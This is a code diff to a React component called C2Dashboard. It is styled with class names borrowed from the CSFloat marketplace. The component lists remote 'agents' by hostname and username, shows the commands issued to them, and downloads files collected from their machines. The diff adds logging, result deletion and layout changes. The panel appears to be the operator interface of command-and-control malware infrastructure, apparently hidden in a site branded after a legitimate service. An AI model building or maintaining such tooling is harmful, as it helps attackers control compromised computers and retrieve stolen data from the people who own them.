@@ -153,11 +153,17 @@ const C2Dashboard: React.FC = () => {
 
   const downloadFile = async (agentId: string, filename: string) => {
     try {
-      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${filename}`, {
-        headers: {
-          'Authorization': `Bearer ${localStorage.getItem('admin_token')}`
-        }
+      console.log('Attempting to download:', { agentId, filename });
+      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`, {
+        headers: getAuthHeaders()
       });
+
+      console.log('Download response:', {
+        status: response.status,
+        statusText: response.statusText,
+        headers: Object.fromEntries(response.headers.entries())
+      });
+
       if (response.ok) {
         const blob = await response.blob();
         const url = window.URL.createObjectURL(blob);
@@ -169,16 +175,19 @@ const C2Dashboard: React.FC = () => {
         window.URL.revokeObjectURL(url);
         document.body.removeChild(a);
       } else {
+        let errorMessage = `Failed to download file: Server returned status ${response.status}`;
         try {
           const errorData = await response.json();
-          alert(`Failed to download file: ${errorData.error || response.statusText}`);
-        } catch {
-          alert(`Failed to download file: Server returned status ${response.status}`);
+          errorMessage = `Failed to download file: ${errorData.error || response.statusText}`;
+          console.error('Download error details:', errorData);
+        } catch (parseError) {
+          console.error('Could not parse error response:', parseError);
         }
+        alert(errorMessage);
       }
     } catch (error) {
       console.error('Error downloading file:', error);
-      alert('Error downloading file');
+      alert('Error downloading file: ' + (error instanceof Error ? error.message : 'Unknown error'));
     }
   };
 
@@ -238,6 +247,31 @@ const C2Dashboard: React.FC = () => {
     } catch (error) {
       console.error('Error deleting agent:', error);
       alert('Error deleting agent');
+    }
+  };
+
+  const deleteResult = async (resultId: number) => {
+    if (!confirm('Are you sure you want to delete this result? This action cannot be undone.')) {
+      return;
+    }
+
+    try {
+      const response = await fetch(`/api/admin/c2/results/${resultId}`, {
+        method: 'DELETE',
+        headers: getAuthHeaders()
+      });
+
+      if (response.ok) {
+        // Remove the result from the local state
+        setResults(results.filter(r => r.id !== resultId));
+        alert('Result deleted successfully');
+      } else {
+        const data = await response.json();
+        alert(`Failed to delete result: ${data.error || 'Unknown error'}`);
+      }
+    } catch (error) {
+      console.error('Error deleting result:', error);
+      alert('Error deleting result');
     }
   };
 
@@ -535,28 +569,47 @@ const C2Dashboard: React.FC = () => {
                       key={result.id}
                       initial={{ opacity: 0, y: 20 }}
                       animate={{ opacity: 1, y: 0 }}
-                      className="bg-csfloat-darker rounded-lg p-4 border border-csfloat-gray/10 hover:border-csfloat-gray/20 transition-colors duration-200"
+                      className="bg-csfloat-dark rounded-lg p-4 shadow-lg relative"
                     >
-                      <div className="flex items-center justify-between mb-3">
-                        <div className="flex items-center space-x-3">
-                          <span className={`px-2 py-1 rounded-full text-xs font-medium ${getCommandTypeColor(result.command_type)}`}>
-                            {result.command_type}
-                          </span>
-                          <span className={`px-2 py-1 rounded-full text-xs font-medium ${result.success ? 'bg-green-500' : 'bg-red-500'}`}>
-                            {result.success ? 'Success' : 'Failed'}
-                          </span>
-                          <span className="text-csfloat-light/60 text-sm">
-                            {result.hostname} ({result.username})
-                          </span>
+                      <div className="flex justify-between items-start mb-2">
+                        <div>
+                          <span className="text-csfloat-light/70">Agent ID: </span>
+                          <span className="text-white font-mono">{result.agent_id}</span>
                         </div>
-                        <span className="text-csfloat-light/60 text-sm">
-                          {new Date(result.created_at).toLocaleString()}
-                        </span>
+                        <div className="flex items-center space-x-2">
+                          {isFileResult(result) && (
+                            <button
+                              onClick={() => downloadFile(result.agent_id, result.file_path.split('/').pop() || 'file')}
+                              className="bg-csfloat-blue hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                            >
+                              Download
+                            </button>
+                          )}
+                          <button
+                            onClick={() => deleteResult(result.id)}
+                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                          >
+                            Delete
+                          </button>
+                        </div>
                       </div>
                       
-                      <div className="mb-3">
-                        <span className="text-csfloat-light/70 text-sm">Command: </span>
-                        <span className="text-white font-mono text-sm">{result.command_data}</span>
+                      <div className="mb-2">
+                        <span className="text-csfloat-light/70">Command: </span>
+                        <span className={`inline-block px-2 py-0.5 rounded text-xs ${getCommandTypeColor(result.command_type)}`}>
+                          {result.command_type}
+                        </span>
+                        <span className="text-white font-mono ml-2">{result.command_data}</span>
+                      </div>
+                      
+                      <div className="mb-2">
+                        <span className="text-csfloat-light/70">Status: </span>
+                        <span className={`text-${result.success ? 'green' : 'red'}-500`}>
+                          {result.success ? 'Success' : 'Failed'}
+                        </span>
+                        <span className="text-csfloat-light/50 text-sm ml-2">
+                          {new Date(result.created_at).toLocaleString()}
+                        </span>
                       </div>
                       
                       {isFileResult(result) && (
@@ -564,12 +617,6 @@ const C2Dashboard: React.FC = () => {
                           <span className="text-csfloat-light/70 text-sm">File: </span>
                           <span className="text-white font-mono text-sm">{result.file_path}</span>
                           <span className="text-csfloat-light/60 text-sm ml-2">({result.file_size} bytes)</span>
-                          <button
-                            onClick={() => downloadFile(result.agent_id, result.file_path.split('/').pop() || 'file')}
-                            className="ml-2 bg-csfloat-blue hover:bg-blue-600 text-white px-2 py-1 rounded text-xs transition-colors duration-200"
-                          >
-                            Download
-                          </button>
                         </div>
                       )}
                       
@@ -587,12 +634,6 @@ const C2Dashboard: React.FC = () => {
                       {result.result_data && !isDataCollection(result) && (
                         <div className="bg-csfloat-darker rounded p-3 border border-csfloat-gray/10">
                           <pre className="text-white text-sm whitespace-pre-wrap">{result.result_data}</pre>
-                        </div>
-                      )}
-                      
-                      {result.error_message && (
-                        <div className="bg-red-500/10 border border-red-500/20 rounded p-3 mt-3">
-                          <span className="text-red-400 text-sm">{result.error_message}</span>
                         </div>
                       )}
                     </motion.div>
